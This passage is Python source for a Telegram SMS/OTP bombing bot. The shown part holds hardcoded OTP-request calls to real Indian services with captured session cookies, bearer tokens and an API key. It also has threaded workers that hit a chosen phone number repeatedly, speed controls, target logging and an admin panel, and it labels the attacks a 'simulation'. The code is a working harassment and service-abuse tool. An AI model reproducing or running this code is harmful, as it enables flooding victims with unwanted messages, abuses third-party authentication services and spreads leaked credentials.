                'WZRK_S_884-575-6R7Z': '%7B%22p%22%3A3%2C%22s%22%3A1759810391%2C%22t%22%3A1759810815%7D'
            }
            headers = {
                'Accept': '/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJ1bmlxdWVfYXNzaWduZWRfbnVtYmVyIjoiYjViMWVmNGQtZGI0MS00NzExLThjMjAtMGU4NjQyZDBlMDJiIiwiY3JlYXRlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjQzOjExIEFNIiwiZXhwaXJlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjU4OjExIEFNIiwiaWF0IjoxNzU5ODEwMzkxLCJpc3MiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJhdWQiOiJodHRwczovL2hvc3QtdXJsIiwiZXhwIjoxNzU5ODExMjkxfQ.N8a-NMFqmgO0vtY9Bp14EF22Jo3bMEB4n_OlcgwF3RZdIJDg5ZwC_WFc1aI-AU7BdWjpfrEc52ZSsfQ73S8pnY8RePnJrKqmE61vdWRY37VAULvD99eMl2AS7W2lEdE5EZoGGM2WqBuTzW8aO5QIt98deWDSyK9xG0v4tfbYG0469g7mOOpeCAuZC3gTIKZ93k7aHyMcf5FPjSsfIdNxqmdW0IrRx6bOdyr_w3AmYheg4aNNfMi5bc6fu_eKXABuwC9O420CFai9TIkImUEqr8Rxy4Sfe7aFVTN6DB8Fv_J1i7GBgCa3YX0VfZiGpVowXmcTqJQcGSiH4uZVRsmf3g',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://oneservice.adityabirlacapital.com',
                'Referer': 'https://oneservice.adityabirlacapital.com/login',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0',
                'authToken': 'eyJraWQiOiJLY2NMeklBY3RhY0R5TWxHVmFVTm52XC9xR3FlQjd2cnNwSWF3a0Z0M21ZND0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzcGRsN2xobHI4ZDkxNm1qcDNyaWt1dGNlIiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhdXRoXC9zdmNhcHAiLCJhdXRoX3RpbWUiOjE3NTk4MDcyNDEsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC5hcC1zb3V0aC0xLmFtYXpvbmF3cy5jb21cL2FwLXNvdXRoLTFfd2h3N0dGb0oxIiwiZXhwIjoxNzU5ODE0NDQxLCJpYXQiOjE3NTk4MDcyNDEsInZlcnNpb24iOjIsImp0aSI6IjVjNTM1ODkxLTBiZjItNDk3ZS04ZTZiLWNkZWZiNzA0OGY1YyIsImNsaWVudF9pZCI6InNwZGw3bGhscjhkOTE2bWpwM3Jpa3V0Y2UifQ.noVIL6Tks0NHZwCmokdjx4hpXntkuNQQjPglIwk-4qG6_DzqmJkYxRkH_ekYxbP0kiWpQp4iDLZasiiP5EIlAXgGZHEY5dEf0jAaiIl8EEGtj4VkUV46njil4LOBFCxsdNfJ-i4hO6iCBddwXu_6OMWJArERdPlg6cpej_y91aPe-UjSuaHexSTmtdzoTRGnZw5W57uiVRZwY3iCPjLWEY-8Qj9a0HqSwTg7oNvOOMac5hCif4IoCNCMP8VoR4F-EttDdWpqW3hETGE6VBMU8R3rY2Q-Vm4CB2VdbToSGtjxFwuMq66OMpVM_G7Fq478JgPhmv9sb85bo2jto8gvow',
                'browser': 'Microsoft Edge',
                'browserVersion': '141.0',
                'csUserId': 'CS6GGNB62PFDLHX6',
                'loginSource': '26',
                'pageName': '/login',
                'source': '151',
                'traceId': 'CSNwb9nPLzWrVfpl'
            }
            data = {'request': 'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, cookies=cookies, json=data, timeout=5)
            return response.status_code == 200

        # 28: Pinknblu
        elif lim == 28:
            cookies = {
                '_ga': 'GA1.1.1922530896.1759808413',
                '_gcl_au': '1.1.178541594.1759808413',
                '_fbp': 'fb.1.1759808414134.913709261257829615',
                'laravel_session': 'eyJpdiI6IllNM0Z5dkxySUswTlBPVjFTN09KMkE9PSIsInZhbHVlIjoiT1pXQWxLUVdYNXJ0REJmU3Q5R0EzNWc5cGJHbzVsaG5oWjRweFRTNG9cL2l4MHdXUVdTWEFtbEsybDdvTjAyazN4dERkdEsrMlBQeTdYUTR4RXNhNWM5WDlrZGtqOEk2eEVcL1BUUEhoN0F4YjJGTWZKd0tcL2JaQitXZmxWWjRcL0hXIiwibWFjIjoiMTNlZDhlNzM2MmIyMzRlODBlNWU0NTJkYjdlOTY5MmJhMzAzM2UyZjEwODAwOTk5Mzk1Yzc3ZTUyZjBhM2I4ZSJ9',
                '_ga_8B7LH5VE3Z': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h1570660322',
                '_ga_S6S2RJNH92': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h0'
            }
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://pinknblu.com',
                'Referer': 'https://pinknblu.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            }
            data = {
                '_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb',
                'country_code': f'+{cc}',
                'phone': pn
            }
            response = session.post('https://pinknblu.com/v1/auth/generate/otp', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()

        # 29: Udaan
        elif lim == 29:
            cookies = {
                'gid': 'GA1.2.153419917.1759810454',
                'sid': 'AVr5misBh4gBAIMSGSayAIeIHvwJYsleAXWkgb87eYu92RyIEsDTp7Wan8qrnUN7IeMj5JEr1bpwY95aCuF1rYO/',
                'WZRK_S_8R9-67W-W75Z': '%7B%22p%22%3A1%7D',
                'mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3Ac4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24device_id%22%3A%22c4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D',
                '_ga_VDVX6P049R': 'GS2.1.s1759810459$o1$g0$t1759810459$j60$l0$h0',
                '_ga': 'GA1.1.803417298.1759810454'
            }
            headers = {
                'accept': '/*',
                'accept-language': 'en-IN',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://auth.udaan.com',
                'referer': 'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0',
                'x-app-id': 'udaan-auth'
            }
            data = {'mobile': pn}
            url = 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true'
            response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()

        # 30: Nuvama Wealth
        elif lim == 30:
            headers = {
                'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e',
                'Referer': 'https://onboarding.nuvamawealth.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0',
                'Content-Type': 'application/json'
            }
            data = {"contactInfo": pn, "mode": "SMS"}
            response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()

        return False

    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False

# ------------------------------------------------------------------
# Worker thread with dynamic interval
# ------------------------------------------------------------------
def api_worker(user_id, phone_number, api_index, stop_flag):
    cc = DEFAULT_COUNTRY_CODE
    while not stop_flag.is_set():
        interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
        try:
            success = getapi(phone_number, api_index, cc)
            with global_request_counter:
                request_counts[user_id] = request_counts.get(user_id, 0) + 1
            if not success:
                logger.debug(f"API {api_index} failed for {phone_number}")
        except Exception as e:
            logger.error(f"API worker error: {e}")
        for _ in range(int(interval * 2)):
            if stop_flag.is_set():
                break
            time.sleep(0.5)

# ------------------------------------------------------------------
# Helper: send log to channel
# ------------------------------------------------------------------
async def send_log(user_id: int, target: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = await context.bot.get_chat(user_id)
        username = user.username or "no_username"
        first_name = user.first_name or "No name"
        text = (
            f"🚨 <b>Simulation Started</b>\n"
            f"👤 User: <a href='tg://user?id={user_id}'>{first_name}</a> (@{username})\n"
            f"📱 Target: <code>{target}</code>\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=text, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Failed to send log: {e}")

# ------------------------------------------------------------------
# Force channel helpers
# ------------------------------------------------------------------
async def get_missing_channels(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> list:
    missing = []
    for ch in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                missing.append(ch)
        except Exception:
            missing.append(ch)
    return missing

async def send_force_channel_prompt(query, context: ContextTypes.DEFAULT_TYPE, missing_channels: list):
    keyboard = []
    for ch in missing_channels:
        keyboard.append([InlineKeyboardButton(f"Join {ch['name']}", url=ch["link"])])
    keyboard.append([InlineKeyboardButton("✅ I've joined", callback_data="check_force_channels")])
    keyboard.append([InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")])
    await query.edit_message_text(
        "⚠️ <b>Access Restricted</b>\n\n"
        "You must join the following channels to use this bot:\n\n" +
        "\n".join([f"• {ch['name']}" for ch in missing_channels]) +
        "\n\nAfter joining, click the button below to continue.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ------------------------------------------------------------------
# Bombing task with status editing
# ------------------------------------------------------------------
async def perform_bombing_task(user_id: int, phone_number: str, context: ContextTypes.DEFAULT_TYPE):
    stop_flag = threading.Event()
    bombing_active[user_id] = stop_flag
    request_counts[user_id] = 0
    user_intervals[user_id] = BOMBING_INTERVAL_SECONDS
    user_start_time[user_id] = time.time()

    # Auto-stop seconds based on role
    if is_admin(user_id) or is_owner(user_id):
        auto_stop_seconds = None   # No auto-stop
    else:
        auto_stop_seconds = NORMAL_USER_AUTO_STOP_SECONDS

    # Send log to channel
    await send_log(user_id, phone_number, context)

    # Start worker threads
    workers = []
    for api_idx in API_INDICES:
        t = threading.Thread(target=api_worker, args=(user_id, phone_number, api_idx, stop_flag))
        t.daemon = True
        workers.append(t)
        t.start()
    bombing_threads[str(user_id)] = workers

    # Initial status message (will be edited)
    control_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop", callback_data="stop_bombing"),
         InlineKeyboardButton("⚡ Speed Up", callback_data="speed_up"),
         InlineKeyboardButton("🐢 Speed Down", callback_data="speed_down")],
        [InlineKeyboardButton("📋 Main Menu", callback_data="main_menu")]
    ])

    initial_status = (
        f"✅ <b>Simulation started</b> for <code>{phone_number}</code>\n\n"
        f"📡 Active endpoints: {len(API_INDICES)}\n"
        f"⏱️ Request interval: {BOMBING_INTERVAL_SECONDS} seconds\n"
        f"{'🛑 Auto‑stop after 10 minutes' if auto_stop_seconds else '🔓 No auto‑stop (admin/owner)'}\n\n"
        f"📊 <b>Status:</b> <code>0</code> requests sent."
    )
    status_msg = await context.bot.send_message(
        chat_id=user_id,
        text=initial_status,
        parse_mode=ParseMode.HTML,
        reply_markup=control_keyboard
    )
    status_msg_id = status_msg.message_id

    last_count = 0
    last_message_time = time.time()
    try:
        while not stop_flag.is_set():
            await asyncio.sleep(1)
            current_count = request_counts.get(user_id, 0)
            current_time = time.time()

            # Auto‑stop check
            if auto_stop_seconds is not None:
                elapsed = current_time - user_start_time[user_id]
                if elapsed >= auto_stop_seconds:
                    logger.info(f"Auto‑stop triggered for user {user_id}")
                    stop_flag.set()
                    break

            if current_count > last_count and (current_time - last_message_time) >= TELEGRAM_RATE_LIMIT_SECONDS:
                interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
                status_text = (
                    f"✅ <b>Simulation started</b> for <code>{phone_number}</code>\n\n"
                    f"📡 Active endpoints: {len(API_INDICES)}\n"
                    f"⏱️ Request interval: {interval} seconds\n"
                    f"{'🛑 Auto‑stop after 10 minutes' if auto_stop_seconds else '🔓 No auto‑stop (admin/owner)'}\n\n"
                    f"📊 <b>Status:</b> <code>{current_count}</code> requests sent."
                )
                try:
                    await context.bot.edit_message_text(
                        chat_id=user_id,
                        message_id=status_msg_id,
                        text=status_text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=control_keyboard
                    )
                except Exception:
                    # If editing fails, send new message and update ID
                    new_msg = await context.bot.send_message(
                        chat_id=user_id,
                        text=status_text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=control_keyboard
                    )
                    status_msg_id = new_msg.message_id
                last_count = current_count
                last_message_time = current_time

            if current_count >= MAX_REQUEST_LIMIT:
                stop_flag.set()
                break
    except asyncio.CancelledError:
        pass
    finally:
        stop_flag.set()
        for t in workers:
            t.join(timeout=2)
        if str(user_id) in bombing_threads:
            del bombing_threads[str(user_id)]
        final_count = request_counts.pop(user_id, 0)
        user_intervals.pop(user_id, None)
        user_start_time.pop(user_id, None)
        final_text = (
            f"✅ <b>Simulation completed</b> for <code>{phone_number}</code>\n\n"
            f"📊 <b>Total requests sent:</b> <code>{final_count}</code>"
            f"{BRANDING}"
        )
        try:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=status_msg_id,
                text=final_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Main Menu", callback_data="main_menu")]])
            )
        except Exception:
            await context.bot.send_message(
                chat_id=user_id,
                text=final_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Main Menu", callback_data="main_menu")]])
            )
        if user_id in bombing_active:
            del bombing_active[user_id]

# ------------------------------------------------------------------
# Main Menu
# ------------------------------------------------------------------
def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("💣 Start Simulation", callback_data="bomb_start")],
        [InlineKeyboardButton("🛑 Stop", callback_data="stop_bombing")],
        [InlineKeyboardButton("⚡ Speed Up", callback_data="speed_up"),
         InlineKeyboardButton("🐢 Speed Down", callback_data="speed_down")],
        [InlineKeyboardButton("📋 Menu", callback_data="main_menu")],
    ]
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

# ------------------------------------------------------------------
# Admin Panel
# ------------------------------------------------------------------
async def show_admin_panel(query, user_id):
    keyboard = [
        [InlineKeyboardButton("👥 List Users", callback_data="admin_list_users")],
        [InlineKeyboardButton("🕒 Recent Users", callback_data="admin_recent_users")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📨 Direct Message", callback_data="admin_dm")],
        [InlineKeyboardButton("🔍 User Lookup", callback_data="admin_lookup")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
        [InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban")],
        [InlineKeyboardButton("🗑 Delete User", callback_data="admin_delete")],
        [InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin")],
        [InlineKeyboardButton("➖ Remove Admin", callback_data="admin_removeadmin")],
        [InlineKeyboardButton("💾 Backup", callback_data="admin_backup")],
    ]
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("💾 Full Backup (Owner)", callback_data="admin_fullbackup")])
    keyboard.append([InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")])
    await query.edit_message_text("👑 <b>Admin Panel</b>\nSelect an action:", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

# ------------------------------------------------------------------
# Callback handler
# ------------------------------------------------------------------
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "main_menu":
        await query.edit_message_text(
            "📋 <b>Main Menu</b>\nChoose an option:",
            parse_mode=ParseMode.HTML,
            reply_markup=get_main_menu(user_id)
        )
        context.user_data.clear()
        return

    elif data == "bomb_start":
        context.user_data['state'] = STATE_AWAITING_PHONE
        await query.edit_message_text(
            "📱 Please send the 10‑digit phone number (without country code) you want to test.\n\n"
            "Example: 9876543210",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]])
        )
        return

    elif data == "stop_bombing":
        if user_id in bombing_active and not bombing_active[user_id].is_set():
            bombing_active[user_id].set()
            await query.edit_message_text("🛑 Stop signal acknowledged. Simulation will terminate shortly.")
            await asyncio.sleep(2)
            await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
        else:
            await query.edit_message_text("ℹ️ No active simulation found.")
            await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
        return

    elif data == "speed_up":
        if user_id not in bombing_active or bombing_active[user_id].is_set():
            await query.edit_message_text("No active simulation to speed up.")
            await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
            return
        current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
        new_val = max(MIN_INTERVAL, current - 1)
        user_intervals[user_id] = new_val
        await query.edit_message_text(f"⚡ Request interval decreased to {new_val} seconds.")
        await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
        return

    elif data == "speed_down":
        if user_id not in bombing_active or bombing_active[user_id].is_set():
            await query.edit_message_text("No active simulation to slow down.")
            await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
            return
        current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
        new_val = min(MAX_INTERVAL, current + 1)
        user_intervals[user_id] = new_val
        await query.edit_message_text(f"🐢 Request interval increased to {new_val} seconds.")
        await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
        return

    elif data == "admin_panel":
        await show_admin_panel(query, user_id)
        return

    elif data == "check_force_channels":
        # Re‑check missing channels
        missing = await get_missing_channels(user_id, context)
        if missing:
            await send_force_channel_prompt(query, context, missing)
        else:
            # All joined, now proceed with bomb if we had pending phone
            phone = context.user_data.get('phone')
            if phone:
                # Start bombing
                asyncio.create_task(perform_bombing_task(user_id, phone, context))
                await query.edit_message_text("✅ All channels joined! Simulation started.")
                await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
                context.user_data.clear()
            else:
                await query.edit_message_text("✅ All channels joined! You can now start a simulation using the menu.")
                await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
        return

    elif data == "confirm_bomb":
        phone = context.user_data.get('phone')
        if not phone:
            await query.edit_message_text("Something went wrong. Please start again.")
            await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
            return

        # Check force channels for normal users
        if not (is_admin(user_id) or is_owner(user_id)):
            missing = await get_missing_channels(user_id, context)
            if missing:
                context.user_data['phone'] = phone  # store for later
                await send_force_channel_prompt(query, context, missing)
                return

        # Start bombing
        asyncio.create_task(perform_bombing_task(user_id, phone, context))
        await query.edit_message_text("✅ Simulation started. You will receive status updates.")
        await query.message.reply_text("Main Menu:", reply_markup=get_main_menu(user_id))
        context.user_data.clear()
        return

    # Admin actions (list users, recent, etc.) – these are paginated, we can reuse existing logic
    elif data.startswith("admin_list_users") or data.startswith("list_users_page"):
        page = 0
        if data.startswith("list_users_page:"):
            page = int(data.split(":")[1])
        else:
            page = 0
        users = get_all_users_paginated(page, 10)
        if not users:
            await query.edit_message_text("No users found.")
            return
        text = f"👥 <b>Users (page {page+1})</b>\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("admin_recent_users") or data.startswith("recent_users_page"):
        page = 0
        if data.startswith("recent_users_page:"):
            page = int(data.split(":")[1])
        else:
            page = 0
        users = get_recent_users_paginated(page, 10)
        if not users:
            await query.edit_message_text("No recent users found.")
            return
        text = f"🕒 <b>Recent Users (last 7 days, page {page+1})</b>\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
        keyboard.append([InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")])
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "admin_stats":
        count = get_user_count()
        await query.edit_message_text(f"📊 <b>Total users:</b> {count}{BRANDING}", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

    elif data == "admin_backup":
        users = get_all_users_paginated(0, 999999)
        data_json = [dict(u) for u in users]
        backup_json = json.dumps(data_json, default=str, indent=2)
        file = io.BytesIO(backup_json.encode())
        file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await query.message.reply_document(document=file, filename=file.name, caption="Backup of users.")
        await query.edit_message_text("Backup generated and sent above.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

    elif data == "admin_fullbackup" and is_owner(user_id):
        # Same as backup but for owner
        users = get_all_users_paginated(0, 999999)
        data_json = [dict(u) for u in users]
        backup_json = json.dumps(data_json, default=str, indent=2)
        file = io.BytesIO(backup_json.encode())
        file.name = f"fullbackup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await query.message.reply_document(document=file, filename=file.name, caption="Full backup of users.")
        await query.edit_message_text("Full backup generated and sent above.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]))

    # Actions that require input (ban, unban, delete, broadcast, dm, lookup, addadmin, removeadmin)
    elif data == "admin_ban":
        context.user_data['state'] = STATE_AWAITING_ADMIN_BAN
        await query.edit_message_text(
            "Please send the user ID of the user to ban.\n\nExample: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    elif data == "admin_unban":
        context.user_data['state'] = STATE_AWAITING_ADMIN_UNBAN
        await query.edit_message_text(
            "Please send the user ID of the user to unban.\n\nExample: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    elif data == "admin_delete":
        context.user_data['state'] = STATE_AWAITING_ADMIN_DELETE
        await query.edit_message_text(
            "Please send the user ID of the user to delete.\n\nExample: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    elif data == "admin_lookup":
        context.user_data['state'] = STATE_AWAITING_ADMIN_LOOKUP
        await query.edit_message_text(
            "Please send the user ID to look up.\n\nExample: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    elif data == "admin_addadmin":
        context.user_data['state'] = STATE_AWAITING_ADMIN_ADDADMIN
        await query.edit_message_text(
            "Please send the user ID to promote to admin.\n\nExample: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    elif data == "admin_removeadmin":
        context.user_data['state'] = STATE_AWAITING_ADMIN_REMOVEADMIN
        await query.edit_message_text(
            "Please send the user ID to demote from admin.\n\nExample: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    elif data == "admin_broadcast":
        context.user_data['state'] = STATE_AWAITING_ADMIN_BROADCAST
        await query.edit_message_text(
            "Please send the broadcast message (text) or reply to a message to forward.\n\n"
            "To cancel, use /cancel or back button.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    elif data == "admin_dm":
        context.user_data['state'] = STATE_AWAITING_ADMIN_DM
        await query.edit_message_text(
            "Please send the user ID to DM.\n\nExample: 123456789",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]])
        )
        return

    else:
        await query.edit_message_text("Unknown action.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Main Menu", callback_data="main_menu")]]))

# ------------------------------------------------------------------
# Message handler for text input (states)
# ------------------------------------------------------------------
async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = context.user_data.get('state', STATE_NONE)

    if state == STATE_AWAITING_PHONE:
        phone = ''.join(filter(str.isdigit, update.message.text))
        if len(phone) < 10 or len(phone) > 15:
            await update.message.reply_text(
                "⚠️ Invalid number. Please enter a 10‑digit number (e.g., 9876543210).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]])
            )
            return

        # Check self‑bombing
        user_phone = get_user_phone(user_id)
        if user_phone and user_phone == phone:
            await update.message.reply_text(
                "⚠️ Self‑testing is not permitted for security reasons. Please use a different number.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]])
            )
            return

        context.user_data['phone'] = phone
        context.user_data['state'] = STATE_AWAITING_CONFIRM
        confirm_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Confirm", callback_data="confirm_bomb"),
             InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
        ])
        await update.message.reply_text(
            f"📱 Target number: <code>{phone}</code>\n\n"
            "Please confirm to start OTP simulation.",
            parse_mode=ParseMode.HTML,
            reply_markup=confirm_kb
        )
        return

    elif state == STATE_AWAITING_ADMIN_BAN:
        try:
            target = int(update.message.text)
            if ban_user(target):
                await update.message.reply_text(f"✅ User {target} banned.")
            else:
                await update.message.reply_text("User not found.")
        except:
            await update.message.reply_text("Invalid user ID.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_UNBAN:
        try:
            target = int(update.message.text)
            if unban_user(target):
                await update.message.reply_text(f"✅ User {target} unbanned.")
            else:
                await update.message.reply_text("User not found or not banned.")
        except:
            await update.message.reply_text("Invalid user ID.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_DELETE:
        try:
            target = int(update.message.text)
            if delete_user(target):
                await update.message.reply_text(f"✅ User {target} deleted.")
            else:
                await update.message.reply_text("User not found.")
        except:
            await update.message.reply_text("Invalid user ID.")
        await update.message.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Admin Panel", callback_data="admin_panel")]]))
        context.user_data.clear()
        return

    elif state == STATE_AWAITING_ADMIN_LOOKUP:
        try:
            uid = int(update.message.text)
            user = get_user_by_id(uid)
            if not user:
                await update.message.reply_text("User not found.")
